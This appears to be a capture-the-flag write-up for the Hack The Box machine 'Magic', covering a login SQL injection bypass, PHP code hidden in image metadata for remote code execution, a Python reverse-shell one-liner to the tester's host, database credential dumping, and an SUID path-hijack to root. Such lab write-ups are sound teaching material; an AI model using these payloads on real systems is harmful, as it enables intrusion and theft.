@@ -1,0 +1,545 @@
+I"�H<blockquote>
+  <p><strong>All information available on this site are for educational purposes only. Use these at your own discretion, the site owners cannot be held responsible for any damages caused.</strong></p>
+</blockquote>
+
+<h2 id="summary"><strong><span style="color:#ff5555">Summary</span></strong></h2>
+<hr />
+
+<ul>
+  <li>SQL injection on login page.</li>
+  <li>Use <strong>Exiftool</strong> to bypass the restricted format.</li>
+  <li>Upload and access the image.</li>
+  <li>Use <strong>mysqldumb</strong> to dump database to get password.</li>
+  <li>Enumeration with Linpeas</li>
+  <li>Exploit <code class="language-plaintext highlighter-rouge">SUID</code> <strong>sysinfo</strong> to get root.</li>
+</ul>
+
+<h2 id="port-scan"><strong><span style="color:#ff5555">Port Scan</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>➜  magic nmap -sC -sV -oA nmap/initial-scan magic.htb     
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 17:35 WIB
+Nmap scan report for magic.htb (10.10.10.185)
+Host is up (0.039s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It has two ports which <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code> by default.</p>
+
+<p>Open the webpage and I found bunch of images that being uploaded by other people and there is a login page, at this point I did not want to run <code class="language-plaintext highlighter-rouge">gobuster</code> yet because this machine kinda straightforward and plus, it has login page that I can play with <strong>SQLi</strong></p>
+
+<h2 id="website"><strong><span style="color:#ff5555">Website</span></strong></h2>
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/port80X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>I use default credentials to log in with no luck.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/tryadminpassX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/wrongcredsX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>And found it has <strong>SQL</strong> injection on login form.</p>
+
+<h2 id="sqli"><strong><span style="color:#ff5555">SQLi</span></strong></h2>
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/firsttryX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>By executing the <code class="language-plaintext highlighter-rouge">'='</code> in both <strong>username</strong> and <strong>password</strong> field, I’m in.</p>
+
+<h2 id="upload-image"><strong><span style="color:#ff5555">Upload Image</span></strong></h2>
+<hr />
+
+<p>It redirects to image uploader with only <code class="language-plaintext highlighter-rouge">jpg</code>,X.png<code class="language-plaintext highlighter-rouge"> and </code>jpeg` extensions that are available.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/canuploadimageX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>So I tried to upload <strong>php reverse shell</strong> in order to check it, and unfortunately I could not upload any extension rather than images extensions.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/notallow1X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>I even changed the format to <code class="language-plaintext highlighter-rouge">image.php.jpg</code>, and tried to upload it again, also it fails even worst.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/notallow2X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="remote-code-execution"><strong><span style="color:#ff5555">Remote Code Execution</span></strong></h2>
+<hr />
+
+<p>I found a medium article that was posting about <strong>image file upload</strong> and it uses exiftool to manipulate the <code class="language-plaintext highlighter-rouge">metadata</code> with php code of the default image.</p>
+
+<blockquote>
+  <p><a href="https://medium.com/@sebnemK/find-flag-in-image-file-upload-c9bc4975f595">Check in here</a></p>
+</blockquote>
+
+<p>So I figured out how to manipulate the metadata and try to execute it with random image</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/exiftoolX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>The file got uploaded successfully and by visiting the web directories &amp; access the file, I got <strong>RCE</strong> (Remote Code Execution)</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/viewsourceX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="reverse-shell"><strong><span style="color:#ff5555">Reverse Shell</span></strong></h2>
+<hr />
+
+<p>So instead of execute command <code class="language-plaintext highlighter-rouge">ls -lah,</code> I put python script one-liner to get reverse shell back to my machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>http://magic.htb/images/uploads/corshine.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>With this simple payload, I was able to get <strong>www-data</strong>’s shell.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/gotshell1X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>Found <code class="language-plaintext highlighter-rouge">db.php5</code> in <code class="language-plaintext highlighter-rouge">/var/www/Magic</code> that shows database’s <code class="language-plaintext highlighter-rouge">credential</code> that being used by username <strong>theseus</strong>.</p>
+
+<h2 id="escalating-to-user"><strong><span style="color:#ff5555">Escalating to user</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre></td><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic$ cat db.php5
+cat db.php5
+&lt;?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+
+    private static $cont  = null;
+
+    public function __construct() {
+        die('Init function is not allowed');
+    }
+
+    public static function connect()
+    {
+        // One connection through whole application
+        if ( null == self::$cont )
+        {
+            try
+            {
+                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
+            }
+            catch(PDOException $e)
+            {
+                die($e-&gt;getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+}
+www-data@ubuntu:/var/www/Magic$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I found the credential <strong>theseus:iamkingtheseus</strong> from the <code class="language-plaintext highlighter-rouge">db.php5</code> and now I can access <code class="language-plaintext highlighter-rouge">Magic's</code> database</p>
+
+<h2 id="mysql-dump"><strong><span style="color:#ff5555">MySQL Dump</span></strong></h2>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+</pre></td><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic$ cd /dev/shm                                                                                                                                                        
+cd /dev/shm                                                                                                                                                                                        
+www-data@ubuntu:/dev/shm$ mysqldump Magic -u theseus -p                                                                                                                                            
+mysqldump Magic -u theseus -p                                                                                                                                                                      
+Enter password: iamkingtheseus                                                                                                                                                                     
+                                                                                                                                                                                                   
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)                                                                                                                                            
+--                                                                                                                                                                                                 
+-- Host: localhost    Database: Magic                                                                                                                                                              
+-- ------------------------------------------------------                                                                                                                                          
+-- Server version       5.7.29-0ubuntu0.18.04.1                                                                                                                                                    
+                                                                                                                                                                                                   
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;                                                                                                                                  
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;                                                                                                                                
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;                                                                                                                                  
+/*!40101 SET NAMES utf8 */;                                                                                                                                                                        
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;                                                                                                                                                        
+/*!40103 SET TIME_ZONE='+00:00' */;                                                                                                                                                                
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2020-08-22  4:15:03
+www-data@ubuntu:/dev/shm$ 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And I found a password from the database which is <strong>Th3s3usW4sK1ng</strong>, so I tried to get to high privilege user in order to get more authorities from the box which is <strong>theseus</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/user1X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/usertxtX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>By seeing <code class="language-plaintext highlighter-rouge">user.txt</code>, I can confirm it’s time to escalate to root.</p>
+
+<h2 id="escalating-to-root"><strong><span style="color:#ff5555">Escalating to Root</span></strong></h2>
+<hr />
+
+<p>From the <code class="language-plaintext highlighter-rouge">nmap</code> results, it has port <code class="language-plaintext highlighter-rouge">22</code> opened and <strong>theseus</strong> has authorized_keys, so that I can add my <strong>ssh</strong> key to user <strong>theseus</strong>.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/addedsshkeyX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>Get in as <strong>SSH</strong> to get a proper shell as <strong>theseus</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/getinsshX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>I decided to run <strong>linpeas</strong> in this machine, normally both with <code class="language-plaintext highlighter-rouge">pspy</code>, but since this machine is not a <code class="language-plaintext highlighter-rouge">hard</code> level machine, it’s not really needed.</p>
+
+<p>I use <code class="language-plaintext highlighter-rouge">scp</code> to send <strong>linpeas</strong> from my machine.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/scp1X.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p>And linpeas was able to detect that <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code> is label as <strong>RED</strong></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/sysinfoexploitX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="suid-binary"><strong><span style="color:#ff5555">SUID Binary</span></strong></h2>
+<hr />
+
+<p><code class="language-plaintext highlighter-rouge">/bin/sysinfo</code> kind of interesting to explore more, also it’s not a default <strong>SUID</strong> binary, and I believe it’s the right way to get me root.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>theseus@ubuntu:/dev/shm$ file /bin/sysinfo
+/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
+theseus@ubuntu:/dev/shm$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>By checking the binary, it has:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">lshw hardware info</code></li>
+  <li><code class="language-plaintext highlighter-rouge">fdisk disk info</code></li>
+  <li><code class="language-plaintext highlighter-rouge">cat cpu info</code></li>
+  <li><code class="language-plaintext highlighter-rouge">free memory usage</code></li>
+</ul>
+
+<p>I decided to create my own <code class="language-plaintext highlighter-rouge">lshw</code> and execute the <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code>.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/htb/magic/perfectrootX.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![]({{ “/images/mandatory/pwned.png”</td>
+      <td>relative_url }})</td>
+    </tr>
+  </tbody>
+</table>
+:ET
